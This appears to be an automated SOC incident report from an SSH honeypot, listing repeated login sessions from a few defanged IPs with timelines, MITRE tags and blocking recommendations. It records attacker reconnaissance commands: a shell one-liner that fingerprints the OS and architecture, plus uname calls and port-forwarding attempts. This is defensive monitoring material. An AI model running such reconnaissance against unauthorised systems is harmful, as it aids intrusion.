| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:02:54` | `cowrie.session.connect` |
| `2026-08-08 04:02:55` | `cowrie.client.version` |
| `2026-08-08 04:02:55` | `cowrie.client.kex` |
| `2026-08-08 04:02:57` | `cowrie.login.success` |
| `2026-08-08 04:02:59` | `cowrie.session.params` |
| `2026-08-08 04:02:59` | `cowrie.command.input` |
| `2026-08-08 04:02:59` | `cowrie.command.input` |
| `2026-08-08 04:02:59` | `cowrie.command.input` |
| `2026-08-08 04:02:59` | `cowrie.command.input` |
| `2026-08-08 04:02:59` | `cowrie.command.input` |
| `2026-08-08 04:02:59` | `cowrie.command.success` |
| `2026-08-08 04:02:59` | `cowrie.command.input` |
| `2026-08-08 04:02:59` | `cowrie.command.input` |
| `2026-08-08 04:02:59` | `cowrie.command.input` |
| `2026-08-08 04:02:59` | `cowrie.command.input` |
| `2026-08-08 04:03:00` | `cowrie.log.closed` |
| `2026-08-08 04:03:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4393057a4b45

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 04:03 |
| **Last Seen** | 2026-08-08 04:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:03:47` | `cowrie.session.connect` |
| `2026-08-08 04:03:47` | `cowrie.client.version` |
| `2026-08-08 04:03:47` | `cowrie.client.kex` |
| `2026-08-08 04:03:47` | `cowrie.login.success` |
| `2026-08-08 04:03:48` | `cowrie.session.params` |
| `2026-08-08 04:03:48` | `cowrie.command.input` |
| `2026-08-08 04:03:48` | `cowrie.log.closed` |
| `2026-08-08 04:03:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d99fddfa19b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-08 04:04 |
| **Last Seen** | 2026-08-08 04:04 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:04:52` | `cowrie.session.connect` |
| `2026-08-08 04:04:52` | `cowrie.client.version` |
| `2026-08-08 04:04:52` | `cowrie.client.kex` |
| `2026-08-08 04:04:55` | `cowrie.login.success` |
| `2026-08-08 04:04:57` | `cowrie.session.params` |
| `2026-08-08 04:04:57` | `cowrie.command.input` |
| `2026-08-08 04:04:57` | `cowrie.command.input` |
| `2026-08-08 04:04:57` | `cowrie.command.input` |
| `2026-08-08 04:04:57` | `cowrie.command.input` |
| `2026-08-08 04:04:57` | `cowrie.command.input` |
| `2026-08-08 04:04:57` | `cowrie.command.success` |
| `2026-08-08 04:04:57` | `cowrie.command.input` |
| `2026-08-08 04:04:57` | `cowrie.command.input` |
| `2026-08-08 04:04:57` | `cowrie.command.input` |
| `2026-08-08 04:04:57` | `cowrie.command.input` |
| `2026-08-08 04:04:57` | `cowrie.log.closed` |
| `2026-08-08 04:04:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11a156751b21

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 04:05 |
| **Last Seen** | 2026-08-08 04:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:05:34` | `cowrie.session.connect` |
| `2026-08-08 04:05:34` | `cowrie.client.version` |
| `2026-08-08 04:05:34` | `cowrie.client.kex` |
| `2026-08-08 04:05:35` | `cowrie.login.success` |
| `2026-08-08 04:05:35` | `cowrie.session.params` |
| `2026-08-08 04:05:35` | `cowrie.command.input` |
| `2026-08-08 04:05:36` | `cowrie.log.closed` |
| `2026-08-08 04:05:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34abb8bd72cf

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-08 04:06 |
| **Last Seen** | 2026-08-08 04:06 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:06:50` | `cowrie.session.connect` |
| `2026-08-08 04:06:51` | `cowrie.client.version` |
| `2026-08-08 04:06:51` | `cowrie.client.kex` |
| `2026-08-08 04:06:53` | `cowrie.login.success` |
| `2026-08-08 04:06:55` | `cowrie.session.params` |
| `2026-08-08 04:06:55` | `cowrie.command.input` |
| `2026-08-08 04:06:55` | `cowrie.command.input` |
| `2026-08-08 04:06:55` | `cowrie.command.input` |
| `2026-08-08 04:06:55` | `cowrie.command.input` |
| `2026-08-08 04:06:55` | `cowrie.command.input` |
| `2026-08-08 04:06:55` | `cowrie.command.success` |
| `2026-08-08 04:06:55` | `cowrie.command.input` |
| `2026-08-08 04:06:55` | `cowrie.command.input` |
| `2026-08-08 04:06:55` | `cowrie.command.input` |
| `2026-08-08 04:06:55` | `cowrie.command.input` |
| `2026-08-08 04:06:56` | `cowrie.log.closed` |
| `2026-08-08 04:06:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-defe999b8af7

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 04:07 |
| **Last Seen** | 2026-08-08 04:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:07:25` | `cowrie.session.connect` |
| `2026-08-08 04:07:25` | `cowrie.client.version` |
| `2026-08-08 04:07:26` | `cowrie.client.kex` |
| `2026-08-08 04:07:26` | `cowrie.login.success` |
| `2026-08-08 04:07:26` | `cowrie.session.params` |
| `2026-08-08 04:07:26` | `cowrie.command.input` |
| `2026-08-08 04:07:27` | `cowrie.log.closed` |
| `2026-08-08 04:07:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52fdf458f8a3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-08 04:08 |
| **Last Seen** | 2026-08-08 04:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:08:46` | `cowrie.session.connect` |
| `2026-08-08 04:08:47` | `cowrie.client.version` |
| `2026-08-08 04:08:47` | `cowrie.client.kex` |
| `2026-08-08 04:08:49` | `cowrie.login.success` |
| `2026-08-08 04:08:51` | `cowrie.session.params` |
| `2026-08-08 04:08:51` | `cowrie.command.input` |
| `2026-08-08 04:08:51` | `cowrie.command.input` |
| `2026-08-08 04:08:51` | `cowrie.command.input` |
| `2026-08-08 04:08:51` | `cowrie.command.input` |
| `2026-08-08 04:08:51` | `cowrie.command.input` |
| `2026-08-08 04:08:51` | `cowrie.command.success` |
| `2026-08-08 04:08:51` | `cowrie.command.input` |
| `2026-08-08 04:08:51` | `cowrie.command.input` |
| `2026-08-08 04:08:51` | `cowrie.command.input` |
| `2026-08-08 04:08:51` | `cowrie.command.input` |
| `2026-08-08 04:08:52` | `cowrie.log.closed` |
| `2026-08-08 04:08:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-626299f15b39

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 04:09 |
| **Last Seen** | 2026-08-08 04:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:09:12` | `cowrie.session.connect` |
| `2026-08-08 04:09:12` | `cowrie.client.version` |
| `2026-08-08 04:09:12` | `cowrie.client.kex` |
| `2026-08-08 04:09:13` | `cowrie.login.success` |
| `2026-08-08 04:09:13` | `cowrie.session.params` |
| `2026-08-08 04:09:13` | `cowrie.command.input` |
| `2026-08-08 04:09:14` | `cowrie.log.closed` |
| `2026-08-08 04:09:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f066035ac450

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-08 04:10 |
| **Last Seen** | 2026-08-08 04:10 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:10:42` | `cowrie.session.connect` |
| `2026-08-08 04:10:42` | `cowrie.client.version` |
| `2026-08-08 04:10:42` | `cowrie.client.kex` |
| `2026-08-08 04:10:45` | `cowrie.login.success` |
| `2026-08-08 04:10:46` | `cowrie.session.params` |
| `2026-08-08 04:10:46` | `cowrie.command.input` |
| `2026-08-08 04:10:46` | `cowrie.command.input` |
| `2026-08-08 04:10:46` | `cowrie.command.input` |
| `2026-08-08 04:10:46` | `cowrie.command.input` |
| `2026-08-08 04:10:46` | `cowrie.command.input` |
| `2026-08-08 04:10:46` | `cowrie.command.success` |
| `2026-08-08 04:10:46` | `cowrie.command.input` |
| `2026-08-08 04:10:46` | `cowrie.command.input` |
| `2026-08-08 04:10:46` | `cowrie.command.input` |
| `2026-08-08 04:10:46` | `cowrie.command.input` |
| `2026-08-08 04:10:47` | `cowrie.log.closed` |
| `2026-08-08 04:10:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa1b8c0d22eb

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 04:11 |
| **Last Seen** | 2026-08-08 04:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:11:00` | `cowrie.session.connect` |
| `2026-08-08 04:11:00` | `cowrie.client.version` |
| `2026-08-08 04:11:00` | `cowrie.client.kex` |
| `2026-08-08 04:11:00` | `cowrie.login.success` |
| `2026-08-08 04:11:01` | `cowrie.session.params` |
| `2026-08-08 04:11:01` | `cowrie.command.input` |
| `2026-08-08 04:11:01` | `cowrie.log.closed` |
| `2026-08-08 04:11:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63e2b4515719

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 04:12 |
| **Last Seen** | 2026-08-08 04:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:12:50` | `cowrie.session.connect` |
| `2026-08-08 04:12:50` | `cowrie.client.version` |
| `2026-08-08 04:12:50` | `cowrie.client.kex` |
| `2026-08-08 04:12:51` | `cowrie.login.success` |
| `2026-08-08 04:12:52` | `cowrie.session.params` |
| `2026-08-08 04:12:52` | `cowrie.command.input` |
| `2026-08-08 04:12:52` | `cowrie.log.closed` |
| `2026-08-08 04:12:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67c575f16148

| Field | Detail |
|---|---|
| **Source IP** | `111.70.10[.]15` |
| **First Seen** | 2026-08-08 04:14 |
| **Last Seen** | 2026-08-08 04:14 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:14:07` | `cowrie.session.connect` |
| `2026-08-08 04:14:08` | `cowrie.client.version` |
| `2026-08-08 04:14:08` | `cowrie.client.kex` |
| `2026-08-08 04:14:10` | `cowrie.login.success` |
| `2026-08-08 04:14:11` | `cowrie.direct-tcpip.request` |
| `2026-08-08 04:14:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.10[.]15` to AbuseIPDB if not already reported
- [ ] Block `111.70.10[.]15` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df2fb7bc5da9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-08 04:14 |
| **Last Seen** | 2026-08-08 04:14 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:14:22` | `cowrie.session.connect` |
| `2026-08-08 04:14:23` | `cowrie.client.version` |
| `2026-08-08 04:14:23` | `cowrie.client.kex` |
| `2026-08-08 04:14:25` | `cowrie.login.success` |
| `2026-08-08 04:14:26` | `cowrie.session.params` |
| `2026-08-08 04:14:26` | `cowrie.command.input` |
| `2026-08-08 04:14:26` | `cowrie.command.input` |
| `2026-08-08 04:14:26` | `cowrie.command.input` |
| `2026-08-08 04:14:26` | `cowrie.command.input` |
| `2026-08-08 04:14:26` | `cowrie.command.input` |
| `2026-08-08 04:14:26` | `cowrie.command.success` |
| `2026-08-08 04:14:26` | `cowrie.command.input` |
| `2026-08-08 04:14:26` | `cowrie.command.input` |
| `2026-08-08 04:14:26` | `cowrie.command.input` |
| `2026-08-08 04:14:26` | `cowrie.command.input` |
| `2026-08-08 04:14:27` | `cowrie.log.closed` |
| `2026-08-08 04:14:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-761bd0777675

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 04:14 |
| **Last Seen** | 2026-08-08 04:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:14:40` | `cowrie.session.connect` |
| `2026-08-08 04:14:40` | `cowrie.client.version` |
| `2026-08-08 04:14:40` | `cowrie.client.kex` |
| `2026-08-08 04:14:40` | `cowrie.login.success` |
| `2026-08-08 04:14:41` | `cowrie.session.params` |
| `2026-08-08 04:14:41` | `cowrie.command.input` |
| `2026-08-08 04:14:41` | `cowrie.log.closed` |
| `2026-08-08 04:14:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f30e3af8203

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-08 04:16 |
| **Last Seen** | 2026-08-08 04:16 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:16:10` | `cowrie.session.connect` |
| `2026-08-08 04:16:11` | `cowrie.client.version` |
| `2026-08-08 04:16:11` | `cowrie.client.kex` |
| `2026-08-08 04:16:13` | `cowrie.login.success` |
| `2026-08-08 04:16:14` | `cowrie.session.params` |
| `2026-08-08 04:16:14` | `cowrie.command.input` |
| `2026-08-08 04:16:14` | `cowrie.command.input` |
| `2026-08-08 04:16:14` | `cowrie.command.input` |
| `2026-08-08 04:16:14` | `cowrie.command.input` |
| `2026-08-08 04:16:14` | `cowrie.command.input` |
| `2026-08-08 04:16:14` | `cowrie.command.success` |
| `2026-08-08 04:16:14` | `cowrie.command.input` |
| `2026-08-08 04:16:14` | `cowrie.command.input` |
| `2026-08-08 04:16:14` | `cowrie.command.input` |
| `2026-08-08 04:16:14` | `cowrie.command.input` |
| `2026-08-08 04:16:15` | `cowrie.log.closed` |
| `2026-08-08 04:16:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7e91b082cb2

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 04:16 |
| **Last Seen** | 2026-08-08 04:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:16:24` | `cowrie.session.connect` |
| `2026-08-08 04:16:24` | `cowrie.client.version` |
| `2026-08-08 04:16:24` | `cowrie.client.kex` |
| `2026-08-08 04:16:24` | `cowrie.login.success` |
| `2026-08-08 04:16:25` | `cowrie.session.params` |
| `2026-08-08 04:16:25` | `cowrie.command.input` |
| `2026-08-08 04:16:25` | `cowrie.log.closed` |
| `2026-08-08 04:16:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-358072ee4b41

| Field | Detail |
|---|---|
| **Source IP** | `196.189.59[.]226` |
| **First Seen** | 2026-08-08 04:16 |
| **Last Seen** | 2026-08-08 04:16 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:16:37` | `cowrie.session.connect` |
| `2026-08-08 04:16:38` | `cowrie.client.version` |
| `2026-08-08 04:16:38` | `cowrie.client.kex` |
| `2026-08-08 04:16:39` | `cowrie.login.success` |
| `2026-08-08 04:16:39` | `cowrie.direct-tcpip.request` |
| `2026-08-08 04:16:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.59[.]226` to AbuseIPDB if not already reported
- [ ] Block `196.189.59[.]226` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c213e109664e

| Field | Detail |
|---|---|
| **Source IP** | `210.4.68[.]72` |
| **First Seen** | 2026-08-08 04:16 |
| **Last Seen** | 2026-08-08 04:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 04:16:38` | `cowrie.session.connect` |
| `2026-08-08 04:16:39` | `cowrie.client.version` |
| `2026-08-08 04:16:39` | `cowrie.client.kex` |
| `2026-08-08 04:16:41` | `cowrie.login.success` |
| `2026-08-08 04:16:41` | `cowrie.direct-tcpip.request` |
| `2026-08-08 04:16:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.4.68[.]72` to AbuseIPDB if not already reported
- [ ] Block `210.4.68[.]72` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

